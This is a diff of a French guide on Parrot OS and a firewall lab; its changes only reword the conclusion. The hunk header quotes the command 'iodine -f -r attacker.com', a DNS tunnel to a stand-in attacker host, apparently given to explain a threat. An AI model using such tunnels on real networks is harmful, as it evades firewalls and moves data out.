@@ -137,14 +137,14 @@ iodine -f -r attacker.com
 
 # ✅ Conclusion
 
-Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vie privée et adaptée aux environnements pentest.
+Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vers la protection de la vie privée et adaptée aux environnements pentest.
 
-Les niveaux 6 et 7 démontrent deux cas concrets :
+Les niveaux 6 et 7 illustrent deux cas concrets :
 
 **Protection avancée d’une machine individuelle** (standalone) 
 **Mise en place d’un routeur/firewall complet** pour un lab réseau.
 
-👉 Ce projet illustre comment un firewall peut évoluer :
+👉 Ce projet montre comment un firewall peut évoluer :
 d’une **simple protection locale** ➝ vers un **composant réseau avancé**.
 
 ---
